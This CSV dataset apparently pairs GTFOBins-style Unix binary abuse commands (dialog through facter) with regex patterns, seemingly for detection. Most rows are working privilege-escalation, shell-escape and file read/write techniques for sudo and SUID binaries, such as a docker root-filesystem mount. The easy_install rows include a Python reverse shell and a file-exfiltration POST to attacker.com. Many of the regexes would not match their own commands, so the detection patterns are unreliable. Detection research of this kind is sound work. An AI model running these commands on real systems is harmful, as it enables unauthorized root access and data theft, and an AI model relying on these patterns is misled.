dialog,file-read,"dialog --textbox ""$LFILE"" 0 0","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dialog\s*\-\-textbox\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dialog,suid,"./dialog --textbox ""$LFILE"" 0 0","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dialog\s*\-\-textbox\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dialog,sudo,"sudo dialog --textbox ""$LFILE"" 0 0","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dialog\s*\-\-textbox\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
diff,file-read,diff --line-format=%L /dev/null $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?diff\s*\-\-line\-format\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
diff,file-read,diff --recursive $TF $LFOLDER,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?diff\s*\-\-recursive\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This lists the content of a directory. `$TF` can be any directory, but for convenience it is better to use an empty directory to avoid noise output."
diff,suid,./diff --line-format=%L /dev/null $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?diff\s*\-\-line\-format\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
diff,sudo,sudo diff --line-format=%L /dev/null $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?diff\s*\-\-line\-format\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dig,file-read,dig -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dig\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dig,sudo,sudo dig -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dig\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dig,suid,./dig -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dig\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
distcc,shell,distcc /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?distcc\s+(?:/bin/(?:sh|bash))),
distcc,suid,./distcc /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?distcc\s*\-p\s+(?:/bin/(?:sh|bash))),
distcc,sudo,sudo distcc /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?distcc\s+(?:/bin/(?:sh|bash))),
dmesg,file-read,"dmesg -rF ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dmesg\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This is not suitable for binary files.
dmesg,shell,"dmesg -H
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dmesg\s*\-H\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
dmesg,sudo,"sudo dmesg -H
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dmesg\s*\-H\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
dmidecode,sudo,"sudo dmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dmidecode\s*\-\-no\-sysfs\s*\-d\s*\-\-dump\-bin\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","It can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.
Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.

- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.

- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.

```
make dmiwrite
TF=$(mktemp)
echo ""DATA"" > $TF
./dmiwrite $TF x.dmi
```
"
dmsetup,sudo,"sudo dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
sudo dmsetup ls --exec '/bin/sh -s'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dmsetup\s*\-\-exec\s*\-s\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dmsetup,suid,"./dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
./dmsetup ls --exec '/bin/sh -p -s'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dmsetup\s*\-\-exec\s*\-p\s*\-s\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dnf,sudo,sudo dnf install -y x-1.0-1.noarch.rpm,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dnf\s*\-y\s+.+),"It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```
"
docker,shell,docker run -v /:/mnt --rm -it alpine chroot /mnt sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?docker\s*\-v\s*\-\-rm\s+.+),The resulting is a root shell.
docker,file-write,"echo ""DATA"" > $TF
docker cp $TF $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF file_to_write","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?docker\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Write a file by copying it to a temporary container and back to the target destination on the host.
docker,file-read,"docker cp file_to_read $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF $TF
cat $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?docker\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Read a file by copying it to a temporary container and back to a new location on the host.
docker,sudo,sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?docker\s*\-v\s*\-\-rm\s+.+),The resulting is a root shell.
docker,suid,./docker run -v /:/mnt --rm -it alpine chroot /mnt sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?docker\s*\-v\s*\-\-rm\s+.+),The resulting is a root shell.
dos2unix,file-write,"dos2unix -f -n ""$LFILE1"" ""$LFILE2""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dos2unix\s*\-f\s*\-n\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dosbox,file-read,"dosbox -c 'mount c /' -c ""type c:$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dosbox\s*\-c\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file content will be displayed in the DOSBox graphical window.
dosbox,file-read,"dosbox -c 'mount c /' -c ""copy c:$LFILE c:\tmp\output"" -c exit
cat '/tmp/OUTPUT'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dosbox\s*\-c\s*\-c\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file is copied to a readable location.
dosbox,file-write,"dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dosbox\s*\-c\s*\-c\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."
dosbox,suid,"./dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dosbox\s*\-c\s*\-c\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."
dosbox,sudo,"sudo dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dosbox\s*\-c\s*\-c\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."
dotnet,shell,"dotnet fsi
System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dotnet\s+(?:/bin/(?:sh|bash))),
dotnet,file-read,"export LFILE=file_to_read
dotnet fsi
System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dotnet\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dotnet,sudo,"sudo dotnet fsi
System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dotnet\s+(?:/bin/(?:sh|bash))),
dpkg,shell,"dpkg -l
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dpkg\s*\-l\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
dpkg,sudo,"sudo dpkg -l
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dpkg\s*\-l\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
dpkg,sudo,sudo dpkg -i x_1.0_all.deb,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dpkg\s*\-i\s+.+),"It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'exec /bin/sh' > $TF/x.sh
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
```
"
dstat,shell,"mkdir -p ~/.dstat
echo 'import os; os.execv(""/bin/sh"", [""sh""])' >~/.dstat/dstat_xxx.py
dstat --xxx",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dstat\s*\-p\s*\-\-xxx\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),
dstat,sudo,"echo 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py
sudo dstat --xxx",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dstat\s*\-\-xxx\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),
dvips,shell,"tex '\special{psfile=""`/bin/sh 1>&0""}\end'
dvips -R0 texput.dvi",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dvips\s+(?:/bin/(?:sh|bash))),
dvips,sudo,"tex '\special{psfile=""`/bin/sh 1>&0""}\end'
sudo dvips -R0 texput.dvi",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dvips\s+(?:/bin/(?:sh|bash))),
dvips,limited-suid,"tex '\special{psfile=""`/bin/sh 1>&0""}\end'
./dvips -R0 texput.dvi",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dvips\s+(?:/bin/(?:sh|bash))),
easy_install,shell,"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
easy_install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?easy_install\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
easy_install,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' > $TF/setup.py
easy_install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?easy_install\s*\-d\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
easy_install,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py
easy_install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?easy_install\s*\-d\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file."
easy_install,file-upload,"export LPORT=8888
TF=$(mktemp -d)
echo 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py
easy_install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?easy_install\s*\-d\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Serve files in the local folder running an HTTP server.
easy_install,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo ""import os;
os.execl('$(whereis python)', '$(whereis python)', '-c', \""\""\""import sys;
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve('$URL', '$LFILE')\""\""\"")"" > $TF/setup.py
pip install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?easy_install\s*\-d\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request. The file path must be absolute.
easy_install,file-write,"export LFILE=/tmp/file_to_save
TF=$(mktemp -d)
echo ""import os;
os.execl('$(whereis python)', 'python', '-c', 'open(\""$LFILE\"",\""w+\"").write(\""DATA\"")')"" > $TF/setup.py
easy_install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?easy_install\s*\-d\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file path must be absolute.
easy_install,file-read,"echo 'print(open(""file_to_read"").read())' > $TF/setup.py
easy_install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?easy_install\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The read file content is wrapped within program messages.
easy_install,library-load,"echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py
easy_install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?easy_install\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
easy_install,sudo,"echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py
sudo easy_install $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?easy_install\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
eb,shell,"eb logs
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?eb\s+(?:/bin/(?:sh|bash))),
eb,sudo,"sudo eb logs
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?eb\s+(?:/bin/(?:sh|bash))),
ed,shell,"ed
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ed\s+(?:/bin/(?:sh|bash))),
ed,file-write,"ed file_to_write
a
DATA
.
w
q","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ed\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ed,file-read,"ed file_to_read
,p
q",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ed\s+.+),
ed,suid,"./ed file_to_read
,p
q",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ed\s+.+),
ed,sudo,"sudo ed
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ed\s+(?:/bin/(?:sh|bash))),
ed,limited-suid,"./ed
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ed\s+(?:/bin/(?:sh|bash))),
efax,suid,"./efax -d ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?efax\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
efax,sudo,"sudo efax -d ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?efax\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
elvish,file-read,"export LFILE=file_to_read
elvish -c 'echo (slurp <$E:LFILE)'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?elvish\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
elvish,file-write,"export LFILE=file_to_write
elvish -c 'echo DATA >$E:LFILE'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?elvish\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
elvish,shell,elvish,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?elvish\s+.+),
elvish,suid,./elvish,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?elvish\s+.+),
elvish,sudo,sudo elvish,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?elvish\s+.+),
emacs,shell,"emacs -Q -nw --eval '(term ""/bin/sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?emacs\s*\-Q\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
emacs,file-write,"emacs file_to_write
DATA
C-x C-s","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?emacs\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
emacs,file-read,emacs file_to_read,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?emacs\s+.+),
emacs,suid,"./emacs -Q -nw --eval '(term ""/bin/sh -p"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?emacs\s*\-Q\s*\-\-eval\s*\-p\s+(?:/bin/(?:sh|bash))),
emacs,sudo,"sudo emacs -Q -nw --eval '(term ""/bin/sh"")'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?emacs\s*\-Q\s*\-\-eval\s+(?:/bin/(?:sh|bash))),
enscript,shell,enscript /dev/null -qo /dev/null -I '/bin/sh >&2',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?enscript\s*\-I\s+(?:/bin/(?:sh|bash))),
enscript,sudo,sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?enscript\s*\-I\s+(?:/bin/(?:sh|bash))),
env,shell,env /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?env\s+(?:/bin/(?:sh|bash))),
env,suid,./env /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?env\s*\-p\s+(?:/bin/(?:sh|bash))),
env,sudo,sudo env /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?env\s+(?:/bin/(?:sh|bash))),
eqn,file-read,"eqn ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?eqn\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
eqn,suid,"./eqn ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?eqn\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
eqn,sudo,"sudo eqn ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?eqn\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
espeak,file-read,"espeak -qXf ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?espeak\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
espeak,suid,"./espeak -qXf ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?espeak\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
espeak,sudo,"sudo espeak -qXf ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?espeak\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ex,shell,"ex
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ex\s+(?:/bin/(?:sh|bash))),
ex,file-write,"ex file_to_write
a
DATA
.
w
q","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ex\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ex,file-read,"ex file_to_read
,p
q",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ex\s+.+),
ex,sudo,"sudo ex
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ex\s+(?:/bin/(?:sh|bash))),
exiftool,file-read,"exiftool -filename=$OUTPUT $LFILE
cat $OUTPUT","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?exiftool\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
exiftool,file-write,exiftool -filename=$LFILE $INPUT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?exiftool\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
exiftool,sudo,sudo exiftool -filename=$LFILE $INPUT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?exiftool\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
expand,file-read,"expand ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
expand,suid,"./expand ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
expand,sudo,"sudo expand ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
expect,file-read,expect $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expect\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files."
expect,shell,expect -c 'spawn /bin/sh;interact',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expect\s*\-c\s+(?:/bin/(?:sh|bash))),
expect,suid,./expect -c 'spawn /bin/sh -p;interact',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expect\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash))),
expect,sudo,sudo expect -c 'spawn /bin/sh;interact',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expect\s*\-c\s+(?:/bin/(?:sh|bash))),
facter,shell,"echo 'exec(""/bin/sh"")' > $TF/x.rb
FACTERLIB=$TF facter","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?facter\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
facter,sudo,"echo 'exec(""/bin/sh"")' > $TF/x.rb
